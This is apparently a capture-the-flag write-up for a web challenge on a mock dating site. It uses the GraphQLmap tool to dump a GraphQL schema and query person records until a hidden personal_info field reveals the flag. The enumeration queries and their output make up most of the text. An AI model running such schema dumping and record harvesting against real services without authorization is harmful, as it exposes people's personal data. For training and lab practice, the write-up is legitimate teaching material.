# GQL all the way
Category: Web, 250 points

## Description

> challenge 2 in Imperva's GQLDating series
> 
> So, I really like the name liron. Maybe this is the person I should be with? I wonder what is Liron’s nickname?


## Solution

This is the follow up for [Find my intro](Find_my_intro.md). We'll continue using `GraphQLmap` to interact with the GraphQL engine.

```console
┌──(user@kali)-[/media/sf_CTFs/technion/GQL_all_the_way]
└─$ python3 ~/utils/web/GraphQLmap/graphqlmap.py -u http://ec2-3-239-182-16.compute-1.amazonaws.com:1234/gql/graphql?query={} -v --method POST --json
   _____                 _      ____  _
  / ____|               | |    / __ \| |
 | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __
 | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \
 | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/
                  | |                                       | |
                  |_|                                       |_|
                              Author: @pentest_swissky Version: 1.0
GraphQLmap > dump_new
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)

User
        name[]:
        email[]:
        rate[]:
Flag
        hint[]:
        key[]:
FlagResult
        success[Boolean]:
        errors[String]:
        flag[]:
Person
        id[ID]:
        nickname[]:
        name[]:
        last_name[]:
        joined_at[]:
        city[]:
        interest_in[]:
        gender[]:
        personal_info[]:
        link[]:
PersonRate
        id[ID]:
        nickname[]:
        name[]:
        last_name[]:
        rate[]:
PersonResult
        success[Boolean]:
        errors[String]:
        person[]:
PersonsResult
        success[Boolean]:
        errors[String]:
        persons[Person]:
PersonRateResult
        success[Boolean]:
        errors[String]:
        person_rate[]:
UserResult
        success[Boolean]:
        errors[String]:
        user[]:
Post
        id[ID]:
        title[String]:
        description[String]:
        created_at[String]:
PostResult
        success[Boolean]:
        errors[String]:
        post[]:
PostsResult
        success[Boolean]:
        errors[String]:
        posts[Post]:
Query
        getFlag[FlagResult]:
        listPosts[PostsResult]:
        getPost[PostResult]: id (ID!),
        listPersons[PersonsResult]:
        getPerson[PersonResult]: id (ID!),
        getPersonByName[PersonsResult]: name (!),
        getPersonByNickName[PersonResult]: nickname (!),
        getPersonRate[PersonRateResult]: id (ID!),
        getUser[UserResult]: email (String!),
Mutation
        createPost[PostResult]: title (String!), description (String!), created_at (!),
        updatePost[PostResult]: id (ID!), title (!), description (!),
        deletePost[PostResult]: id (!),
        updatePersonRate[PersonRateResult]: id (ID!), rate (Int!),
        updateUserRate[UserResult]: email (String!), rate (Int!),
__Schema
__Type
__Field
__InputValue
__EnumValue
__Directive
GraphQLmap >
```

Let's search for people named `Liron`:

```
GraphQLmap > query { getPersonByName(name: "liron"){ persons{ id nickname name last_name joined_at city interest_in gender personal_info link } } }
query { getPersonByName(name: "liron"){ persons{ id nickname name last_name joined_at city interest_in gender personal_info link } } }
{
    "data": {
        "getPersonByName": {
            "persons": [
                {
                    "city": "Ramat Gan",
                    "gender": "Male",
                    "id": "1",
                    "interest_in": "Female",
                    "joined_at": "2020-04-02",
                    "last_name": "cohen",
                    "link": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRP5-vk1knRdbYlriqbcv0KxnOr5vdHTxAosA&usqp=CAU",
                    "name": "liron",
                    "nickname": "lironi",
                    "personal_info": null
                },
                {
                    "city": "Holon",
                    "gender": "Female",
                    "id": "3",
                    "interest_in": "Male",
                    "joined_at": "2020-08-02",
                    "last_name": "menashe",
                    "link": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTX08GgPVSAD14yfE0hhyuohywu1KrfGpMKTg&usqp=CAU",
                    "name": "liron",
                    "nickname": "lirlir",
                    "personal_info": null
                }
            ]
        }
    }
}
```

We see the nicknames `lironi` and `lirlir`, but they are not accepted. What else can we find about these users? We can also try the `getPerson` API:

```console
GraphQLmap > {getPerson (id: 1) {success errors person {id nickname name last_name joined_at city interest_in gender personal_info link} } }
{getPerson (id: 1) {success errors person {id nickname name last_name joined_at city interest_in gender personal_info link} } }
{
    "data": {
        "getPerson": {
            "errors": null,
            "person": {
                "city": "Ramat Gan",
                "gender": "Male",
                "id": "1",
                "interest_in": "Female",
                "joined_at": "2020-04-02",
                "last_name": "cohen",
                "link": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRP5-vk1knRdbYlriqbcv0KxnOr5vdHTxAosA&usqp=CAU",
                "name": "liron",
                "nickname": "lironi",
                "personal_info": null
            },
            "success": true
        }
    }
}
GraphQLmap > {getPerson (id: 3) {success errors person {id nickname name last_name joined_at city interest_in gender personal_info link} } }
{getPerson (id: 3) {success errors person {id nickname name last_name joined_at city interest_in gender personal_info link} } }
{
    "data": {
        "getPerson": {
            "errors": null,
            "person": {
                "city": "Holon",
                "gender": "Female",
                "id": "3",
                "interest_in": "Male",
                "joined_at": "2020-08-02",
                "last_name": "menashe",
                "link": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTX08GgPVSAD14yfE0hhyuohywu1KrfGpMKTg&usqp=CAU",
                "name": "liron",
                "nickname": "lirlir",
                "personal_info": "cstechnion{b00m!_y0u_n41l3d_17}"
            },
            "success": true
        }
    }
}
```

The flag: `cstechnion{b00m!_y0u_n41l3d_17}`.